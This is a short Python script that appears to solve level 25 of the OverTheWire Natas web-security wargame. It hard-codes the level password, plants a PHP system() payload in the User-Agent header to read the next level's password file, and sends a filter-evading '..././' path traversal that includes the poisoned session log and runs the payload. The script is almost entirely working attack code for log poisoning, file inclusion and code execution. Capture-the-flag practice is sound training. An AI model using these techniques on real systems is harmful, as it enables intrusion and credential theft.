php headers
```
#!/usr/bin/env python
import requests
import re

username = 'natas25'
password = 'ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws'

url = 'http://%s.natas.labs.overthewire.org' % username

session = requests.Session()

headers = {"User-Agent": "<?php system('cat /etc/natas_webpass/natas26'); ?>"}

response = session.get(url, auth=(username,password))

print(session.cookies['PHPSESSID'])

response = session.get(url, auth=(username,password))

response = session.post(url, headers = headers, data = {"lang" : "..././..././..././..././..././var/www/natas/natas25/logs/natas25_"+ session.cookies['PHPSESSID'] +".log"}, auth=(username,password))

content = response.text

print(content)
```
